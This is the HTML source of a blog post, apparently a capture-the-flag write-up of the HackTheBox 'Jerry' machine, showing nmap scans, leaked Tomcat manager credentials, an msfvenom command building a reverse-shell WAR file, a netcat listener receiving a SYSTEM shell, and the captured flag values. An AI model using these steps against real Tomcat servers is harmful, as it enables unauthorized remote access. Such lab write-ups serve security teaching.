@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Jerry - HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Jerry - HackTheBox | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Jerry - HackTheBox" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/jerry-htb" />
+<meta property="og:url" content="http://localhost:4000/jerry-htb" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-31T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Jerry - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2023-12-31T00:00:00+00:00","datePublished":"2023-12-31T00:00:00+00:00","description":"Introduction","headline":"Jerry - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/jerry-htb"},"url":"http://localhost:4000/jerry-htb"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/jerry-htb$</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Jerry - HackTheBox</h2>
+  <time datetime="2023-12-31T00:00:00+00:00" class="by-line">31 Dec 2023</time>
+  <p>Estimated read time: 7 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>This going to be our last write-up of the year. In that manner, we are going to be tackling the Jerry box in <a href="https://app.hackthebox.com">HackTheBox</a>. From the machine picture, it seems to be a Windows machine. Let’s get started!</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+
+<p>We can take a look at the machine description. Let’s take a look:</p>
+
+<blockquote>
+  <p>Description</p>
+
+  <p>Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.</p>
+</blockquote>
+
+<p>Ok! So the machine given to us is running Apacha Tomcat with weak credentials.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>As always, let’s keep our mindset:</p>
+
+<ol>
+  <li>Understanding basic concepts</li>
+  <li>Understanding the problem</li>
+  <li>Crafting an attack</li>
+  <li>Solving</li>
+</ol>
+
+<p>However, it is worth noting that for an actual realistic penetration testing, we might adjust some of our steps. We shall call the first step “Recon”, since it is where we are going to be performing our reconnaissance.</p>
+
+<h2 id="step-1---reconnaissance"><a href="#mindset-step1"></a>Step 1 - Reconnaissance</h2>
+
+<p>Similar to understanding basic concepts, the recon part aims to help us gather information on our target by analyzing what we have on our disposal. For a black box pentest, this is the position we are right now. We first need intel on our target: which ports are open? can we investigate every service available? is there a web service (though this is already answered by the CTF description).</p>
+
+<p>We shall start our recon with <code class="language-plaintext highlighter-rouge">nmap</code>. I like to start my mapping the network with a simple <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nv">$IP</span>
+Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-31 12:29 UTC
+Nmap scan report <span class="k">for </span>10.10.10.95
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.35 seconds
+</code></pre></div></div>
+
+<p>As we can see, there is a webservice running on port 8080. Let’s run <code class="language-plaintext highlighter-rouge">nmap</code> again, but now analyzing this port’s info. I’m also wondering if port 22 is open, but Windows’ firewall is blocking our pings. So, I ran:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nv">$IP</span> <span class="nt">-p</span> 22,8080 <span class="nt">-sV</span> <span class="nt">-Pn</span>
+Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-31 12:31 UTC
+Nmap scan report <span class="k">for </span>10.10.10.95
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE    SERVICE VERSION
+22/tcp   filtered ssh
+8080/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.72 seconds
+</code></pre></div></div>
+
+<p>Alright. We got our Apache Tomcat right there. Port 22 seems to be filtered, which might indicate a firewall behind it. Let’s access the web service at <code class="language-plaintext highlighter-rouge">http://$IP:8080</code>.</p>
+
+<p><img src="../figs/tomcat-jerry-1.png" alt="tomcat homepage" /></p>
+
+<p>It seems we are hacking someone who just installed Apache Tomcat version 7.0.88 on this machine. First thing that glances my eyes is the “Server Status” button. Let’s access it:</p>
+
+<p><img src="../figs/tomcat-jerry-2.png" alt="tomcat server status" /></p>
+
+<p>We get a bunch of nice information here. First, we can see that we are running on a Windows Server 2012 R2 on an amd64 architecture. We also can see that the hostname is “JERRY”. Since there is nothing much else here, we can continue our recon through the website manually. After some digging, we find the relative path <code class="language-plaintext highlighter-rouge">/docs/appdev/deployment.html</code>, which leads to:</p>
+
+<p><img src="../figs/tomcat-jerry-3.png" alt="tomcat deploy docs" /></p>
+
+<p>This is interesting. It is telling us that to deploy an application in this version, we need to compress it into Web Archive (WAR) format.</p>
+
+<blockquote>
+  <p>A web application is defined as a hierarchy of directories and files in a standard layout. Such a hierarchy can be accessed in its “unpacked” form, where each directory and file exists in the filesystem separately, or in a “packed” form known as a Web ARchive, or WAR file. The former format is more useful during development, while the latter is used when you distribute your application to be installed.</p>
+
+  <p>To facilitate creation of a Web Application Archive file in the required format, it is convenient to arrange the “executable” files of your web application (that is, the files that Tomcat actually uses when executing your app) in the same organization as required by the WAR format itself.</p>
+</blockquote>
+
+<p>Since apps can be deployed, we somehow might be able to see which ones are running or have already deployed in this machine. While looking for it, I stumbled upon a login-style alert box, when trying to access the “Host manager”. Since I did not know any credentials, I simply clicked cancel on it, and then, as an error, the server lead me here:</p>
+
+<p><img src="../figs/tomcat-jerry-5.png" alt="tomcat credential leak" /></p>
+
+<p>So we have found a pair of credentials that might be the ones needed to access the “Host Manager”. The credentials are <code class="language-plaintext highlighter-rouge">tomcat:s3cret</code>. Even though we have found them, trying to access the “Host manager” with them gives us a 403 response.</p>
+
+<p>Upon some more investigation, we find this relative path <code class="language-plaintext highlighter-rouge">/manager/html/list</code>, which leads to this page:</p>
+
+<p><img src="../figs/tomcat-jerry-4.png" alt="tomcat deploy list" /></p>
+
+<p>It seems we are able to upload an app directly to the server from the web service. If this is the case, then we might be able to get a reverse shell by deploying an app.</p>
+
+<h2 id="step-2---understanding-the-problem"><a href="#mindset-step2"></a>Step 2 - Understanding the problem</h2>
+
+<p>Alright, it seems we have found our way in with our recon. Let’s take a look at what we have found so far:</p>
+
+<ol>
+  <li>Leaked credentials <code class="language-plaintext highlighter-rouge">tomcat:s3cret</code> in error pages.</li>
+  <li>Deployment app that accepts WAR files.</li>
+  <li>An upload functionality within the web service.</li>
+  <li>Unaccessible Host Manager page, giving 403.</li>
+</ol>
+
+<p>Now, we might be able to think of an attack vector. We could investigate the unaccessible Host Manager page to see if we find more vectors. However, after some basic attempts, I’ve found nothing there. Which leads me to think our way in is through a reverse shell. If we manage to deploy a reverse shell app, we might be able to get foothold on the system.</p>
+
+<h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
+
+<p>For that task, we can use <code class="language-plaintext highlighter-rouge">msfvenom</code>. A simple Google Search “msfvenom war file” leads to <a href="https://charlesreid1.com/wiki/MSFVenom">this</a> page. We can see that there is a specific payload for Tomcat. We can generate our payload with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;YOUR IP&gt; <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
+</code></pre></div></div>
+
+<p>This will create a <code class="language-plaintext highlighter-rouge">shell.war</code> file that is going to be our revserse shell app. After that, we upload this shell into the web server:</p>
+
+<p><img src="../figs/tomcat-jerry-6.png" alt="tomcat deploy list" /></p>
+
+<p>If successful, we are going to see a “OK” message right on the top of the page, underneath “Tomcat Web Application Manager”. Now, we need to start listening on port 1234 (or the port chosen as a payload to msfvenom) on our local machine with <code class="language-plaintext highlighter-rouge">nc -lnvp 1234</code>.</p>
+
+<p>Now, we simply access <code class="language-plaintext highlighter-rouge">/shell/</code>, or the name of the app WAR file (without .war), and we shall get access to the machine through netcat:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>nc <span class="nt">-lnvp</span> 1234
+Connection from 10.10.10.95:49192
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\a</span>pache-tomcat-7.0.88&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\a</span>pache-tomcat-7.0.88&gt;
+</code></pre></div></div>
+
+<p>We not only got access to the machine but also we are logged in as the Windows Administrator!</p>
+
+<h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
+
+<p>Now, we can just retrieve the flags. They are located at <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\flags</code> directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags
+
+06/19/2018  06:09 AM    &lt;DIR&gt;          <span class="nb">.</span>
+06/19/2018  06:09 AM    &lt;DIR&gt;          ..
+06/19/2018  06:11 AM                88 2 <span class="k">for </span>the price of 1.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             88 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,418,737,152 bytes free
+</code></pre></div></div>
+
+<p>We can easily retrieve them with the command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags&gt;type <span class="s2">"2 for the price of 1.txt"</span>
+<span class="nb">type</span> <span class="s2">"2 for the price of 1.txt"</span>
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+</code></pre></div></div>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>In this CTF, we adopted a different approach, starting with thorough reconnaissance, and then gaining a foothold in the system. We exploited an Apache Tomcat file upload vulnerability, which provided us with a reverse shell as a Windows Administrator.</p>
+
+<p>With a good recon, finding your way in became trivial in this CTF!</p>
+
+<p>I hope you liked this write-up and learned something new. As always, don’t forget to do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
